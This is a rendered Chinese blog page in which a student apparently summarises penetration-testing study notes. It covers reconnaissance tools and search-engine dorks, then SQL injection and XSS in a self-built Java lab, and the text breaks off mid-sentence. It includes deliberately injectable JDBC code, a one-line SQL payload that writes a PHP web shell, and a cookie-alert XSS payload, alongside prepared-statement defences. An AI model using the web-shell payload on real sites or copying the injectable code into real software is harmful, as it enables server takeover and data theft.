@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="wea5e1">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2026/01/19/不知道写什么标题好的文章/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不知道写什么标题好的文章">
+<meta property="og:url" content="http://example.com/2026/01/19/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%86%99%E4%BB%80%E4%B9%88%E6%A0%87%E9%A2%98%E5%A5%BD%E7%9A%84%E6%96%87%E7%AB%A0/index.html">
+<meta property="og:site_name" content="懒羊羊的小屋">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-01-19T14:47:04.000Z">
+<meta property="article:modified_time" content="2026-02-14T04:03:06.627Z">
+<meta property="article:author" content="wea5e1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            不知道写什么标题好的文章 | 懒羊羊的小屋
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"No one but you","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                懒羊羊的小屋
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">不知道写什么标题好的文章</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/lyy.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">wea5e1</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-01-19 22:47:04</span>
+        <span class="mobile">2026-01-19 22:47:04</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-02-14 12:03:06</span>
+            <span class="mobile">2026-02-14 12:03:06</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="不知道起什么标题好"><a href="#不知道起什么标题好" class="headerlink" title="不知道起什么标题好"></a>不知道起什么标题好</h1><p>放了假看了点java打了几个linux的靶机，看java感觉好厉害，这就直接打出来漏洞了？，看他们打靶机感觉思路好牛逼啊这你给我提权了？，想到自己哎哎哎，不过想到开学要去打比赛以及突然想起来自己期末周的时候被拷打，不行！！！，那就自己稍微总结一下关于渗透的知识。关于渗透总感觉自己在qq群里面去打了，应该知道点，但似乎就是不知道了，打了也是白打，md,我和傻子一样</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>虽然好像在打靶机的时候可能稍微用一点，不过自己在被拷打的时候确实是啥也而不知道，正好也稍微改一下，把一些面试时候的东西也总结一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260119205647108-1768834523445-2.png"
+                      alt="image-20260119205647108"
+                ></p>
+<p>这里参考的是渗透安全HackTwo(微信公众号直接去搜就行，非常好的公众号)</p>
+<p>首先是对域名进行搜集</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如www.wea5e1.top --&gt; 一级域名是我们的wea5e1.top，也就是主域名，而www则是二级域名</span><br></pre></td></tr></table></figure></div>
+
+<p>正常我们去拿到域名的时候，都要去一些网站去查查</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>：天眼查，看看有没有旁段啊什么的，比如blog.wea5e1.top，szlcm.wea5e1.top,lcmznb.wea5e1.top</span><br><span class="line"><span class="number">2</span>：网站备案号查询：看备案信息什么的： 备案号 鲁ICP备<span class="number">2025140415</span>号，然后从备案信息反向查看网站信息什么的</span><br><span class="line"><span class="number">3</span>，kali的dnsenum命令【找子域名】：dnsenum wea5e1.top</span><br><span class="line"><span class="number">4</span>，msssl官网查询：https:<span class="comment">//myssl.com</span></span><br><span class="line"><span class="number">5</span>，使用其他的方式去获得，比如他的网站是a.wea5e1.top，那看看有没有b.wea5e1.top，c.什么的</span><br><span class="line"><span class="number">6</span>，搜索引擎查询(goole啊百度啊什么的):site:wea5e1.top</span><br><span class="line">关于搜索引擎的语法；</span><br><span class="line">	site:oldboyedu.com   # 搜索域名</span><br><span class="line">	inurl:?id=<span class="number">1</span>          # 根据url过滤</span><br><span class="line">	intext: 后台登录      # 根据页面内容过滤</span><br><span class="line">	intitle: 登录        # 过滤title</span><br><span class="line">	filetype: pdf        # 过滤文件</span><br><span class="line">	site:zabbix.com filetype: pdf   # 组合使用</span><br><span class="line"><span class="number">7</span>，fofa引擎</span><br><span class="line">title=<span class="string">&quot;wea5e1的妙妙屋&quot;</span></span><br><span class="line">	os=<span class="string">&quot;ubuntu&quot;</span></span><br><span class="line">	header=<span class="string">&quot;elastic&quot;</span></span><br><span class="line">	domain=<span class="string">&quot;wea5e1.top&quot;</span></span><br><span class="line">	port=<span class="string">&quot;3306&quot;</span></span><br><span class="line">	protocol=<span class="string">&quot;https&quot;</span> &amp;&amp; title=<span class="string">&quot;wea5e1&quot;</span> &amp;&amp; port=<span class="string">&quot;3306&quot;</span></span><br><span class="line">	host=<span class="string">&quot;.edu.cn&quot;</span>   # 类似与谷歌语法中inurl</span><br><span class="line">	cert=<span class="string">&quot;&quot;</span>          # 通过证书序列号查询</span><br><span class="line"><span class="number">8.</span>JSFinder脚本（python）python JSFinder.py -u http:<span class="comment">//wea5e1.top</span></span><br><span class="line"><span class="number">9.</span>看看一些漏洞平台什么的比如 <span class="number">360</span> 奇安信 微步 安恒</span><br><span class="line"><span class="number">10.</span>直接拿工具去扫url（少用）dirsearch 御剑 feroxbuster等等</span><br></pre></td></tr></table></figure></div>
+
+<p>然后呢，对ip进行搜集</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.ping</span><br><span class="line">ping  baidu.com</span><br><span class="line">正在 Ping baidu.com [111.63.65.247] 具有 32 字节的数据:</span><br><span class="line">来自 111.63.65.247 的回复: 字节=32 时间=83ms TTL=47</span><br><span class="line">来自 111.63.65.247 的回复: 字节=32 时间=78ms TTL=47</span><br><span class="line">来自 111.63.65.247 的回复: 字节=32 时间=74ms TTL=47</span><br><span class="line">2.在线的网站</span><br><span class="line">比如：www.boce.com https://ti.360.cn/</span><br><span class="line">3.ping旁站</span><br><span class="line">4.fofa搜索引擎</span><br></pre></td></tr></table></figure></div>
+
+<p>这个推荐常用的工具：nmap goby和fofa搜索引擎</p>
+<p>然后通过去查看一些网站的信息啊，看看版本号和中间件啊什么的(怎么看的我不知道，我只知道我在路上走着，突然看见利用 <strong>Fofa</strong>、<strong>Censys</strong>、<strong>Shodan</strong> 等平台和网站的header头给我说他们的信息什么的)</p>
+<h2 id="漏洞扫描和验证"><a href="#漏洞扫描和验证" class="headerlink" title="漏洞扫描和验证"></a>漏洞扫描和验证</h2><h3 id="工具扫描："><a href="#工具扫描：" class="headerlink" title="工具扫描："></a>工具扫描：</h3><p>俺不中咧</p>
+<h3 id="手动判断："><a href="#手动判断：" class="headerlink" title="手动判断："></a>手动判断：</h3><p>至于怎么去判断，那就来到了重点了，漏洞简解(正好昨天看Java看烦了，自己搭了一个靶场)</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260119211826946-1768834523445-1.png"
+                      alt="image-20260119211826946"
+                ></p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>攻击目标服务器</p>
+<p>省流：可以和数据库去交换的地方，比如搜索框，登录框</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以通过去查看header头</span><br><span class="line">get 请求：请求行</span><br><span class="line">post请求：请求主体</span><br><span class="line">请求头：cookie、user-agent、referer、xff等等，测试嘛哈哈哈</span><br></pre></td></tr></table></figure></div>
+
+<p>先来说这个(php的就不说了，网上有sql-labs靶场可以去做做看)</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// 原生sql语句动态拼接 参数未进行任何处理</span><br><span class="line">public R vul1(String type,String id,String username,String password) &#123;</span><br><span class="line">    //注册数据库驱动类</span><br><span class="line">    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line"></span><br><span class="line">    //调用DriverManager.getConnection()方法创建Connection连接到数据库</span><br><span class="line">    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);</span><br><span class="line"></span><br><span class="line">    //调用Connection的createStatement()或prepareStatement()方法 创建Statement对象</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    switch (type) &#123;</span><br><span class="line">        case &quot;add&quot;:</span><br><span class="line">            //这里没有标识id id自增长</span><br><span class="line">            sql = &quot;INSERT INTO sqli (username, password) VALUES (&#x27;&quot; + username + &quot;&#x27;, &#x27;&quot; + password + &quot;&#x27;)&quot;;</span><br><span class="line">            //通过Statement对象执行SQL语句，得到ResultSet对象-查询结果集</span><br><span class="line">            // 这里注意一下 insert、update、delete 语句应使用executeUpdate()</span><br><span class="line">            rowsAffected = stmt.executeUpdate(sql);</span><br><span class="line">            //关闭ResultSet结果集 Statement对象 以及数据库Connection对象 释放资源</span><br><span class="line">            stmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line">            return R.ok(message);</span><br><span class="line">        case &quot;delete&quot;:</span><br><span class="line">            sql = &quot;DELETE FROM users WHERE id = &#x27;&quot; + id + &quot;&#x27;&quot;;</span><br><span class="line">            rowsAffected = stmt.executeUpdate(sql);</span><br><span class="line">            ...</span><br><span class="line">        case &quot;update&quot;:</span><br><span class="line">            sql = &quot;UPDATE sqli SET password = &#x27;&quot; + password + &quot;&#x27;, username = &#x27;&quot; + username + &quot;&#x27; WHERE id = &#x27;&quot; + id + &quot;&#x27;&quot;;</span><br><span class="line">            rowsAffected = stmt.executeUpdate(sql);</span><br><span class="line">            ...</span><br><span class="line">        case &quot;select&quot;:</span><br><span class="line">            sql = &quot;SELECT * FROM users WHERE id  = &quot; + id;</span><br><span class="line">            ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;//正好稍微会看了点java代码嘻嘻嘻</span><br></pre></td></tr></table></figure></div>
+
+<p>看上面正常来说我们可以去控制的参数应该是type,id,username,passwd,那我们就去发送请求</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public R vul1(String type,String id,String username,String password) &#123;</span><br><span class="line">...</span><br><span class="line"> 	case &quot;select&quot;:</span><br><span class="line">            sql = &quot;SELECT * FROM users WHERE id  = &quot; + id;</span><br><span class="line">            ResultSet rs = stmt.executeQuery(sql);</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:801/sqli/jdbc/vul1?id=1&amp;type=select&amp;_=1768828769208</span><br></pre></td></tr></table></figure></div>
+
+<p>前面的接口就先不说了，可以看到我们可以去控制的参数是id和type(_没啥用)不过这个只是select的接下来去对其他去尝试，发现就是我们可以去控制的参数，这里就只讲select了，查看上面的代码，我们可以去发现我们去发送查询请求的参数是被直接拼接在sql数据库语法里面，也就是说我们的参数直接拼接在数据库执行代码里面去执行代码。</p>
+<p>那么他的漏洞原理就显而易见了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序员在开发代码的时候，连接数据库的参数，未经过滤，让用户输入的参数去拼接sql语句进入数据库进行增删改查；</span><br></pre></td></tr></table></figure></div>
+
+<p>危害就不用说了，大大的危害啊，可以去加用户，然后查看数据库里面的敏感信息啊，还能去getshell</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; INTO OUTFILE &#x27;index路径上一级路径/shell.php&#x27;;)</span><br></pre></td></tr></table></figure></div>
+
+<p>至于怎么去测试 </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Lcmpro/article/details/152456724?spm=1001.2014.3001.5501</span><br><span class="line">https://fushuling.com/ //这个师傅里面有关于sql注入通关的非常好的博客</span><br></pre></td></tr></table></figure></div>
+
+<p>至于怎么去防御，简单，加个预编译不就好了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String query = &quot;SELECT * FROM users WHERE last_name = ?&quot;;</span><br><span class="line">PreparedStatement statement = connection.prepareStatement(query);</span><br><span class="line">statement.setString(1, accountName);</span><br><span class="line">ResultSet results = statement.executeQuery();</span><br></pre></td></tr></table></figure></div>
+
+<p>这样就直接让用户传的参数去防御了。不过真的防住了吗？</p>
+<p>在java里面mybatis使用率是非常高的。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">里面的sql语法是</span><br><span class="line">@Select(&quot;SELECT * FROM admin WHERE id = $&#123;id&#125;&quot;)//#&#123;&#125;是预编译</span><br></pre></td></tr></table></figure></div>
+
+<p>我们对${}去进行sql注入</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260119220344915-1768834523445-3.png"
+                      alt="image-20260119220344915"
+                ></p>
+<p>发现没有防住，而使用#{}则防住了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;&#125;会被 MyBatis 解析为 PreparedStatement 的占位符 ?，会自动为字符串添加单引号，例如传入 admin 会变成 &#x27;admin&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>不过真的又防住了吗？</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当我们使用like去模糊匹配，就会去报错，我们要想去使用like只能去进行黑白名单过滤</span><br><span class="line">什么，你说什么搜索like匹配，浏览器搜索啊</span><br><span class="line">当我们使用order by有输入升/降序参数同样报错，同样还有in。</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>用户（后端管理员）</p>
+<p>省流</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据交互地方</span><br><span class="line">搜索栏</span><br><span class="line">文档栏</span><br><span class="line">留言板</span><br><span class="line">登入框</span><br><span class="line">聊天框</span><br><span class="line">js事件  点击  触碰  按钮   加载</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原生漏洞场景,未加任何过滤，Controller接口返回Json类型结果</span></span><br><span class="line"><span class="keyword">public</span> R <span class="title function_">vul1</span><span class="params">(String payload)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> R.ok(payload);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// R 是对返回结果的封装工具util</span></span><br><span class="line"><span class="comment">// 返回结果：</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     &quot;msg&quot;: &quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;,</span></span><br><span class="line"><span class="comment">//     &quot;code&quot;: 0</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// payload在json中是不会触发xss的 需要解析到页面中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原生漏洞场景,未加任何过滤，Controller接口返回String类型结果</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">vul2</span><span class="params">(String payload)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>发现并没有对参数进行过滤(斯，不对，不能去sql注入，没有对数据库进行操作)</p>
+<p>发现我们输什么回来什么，我直接</p>
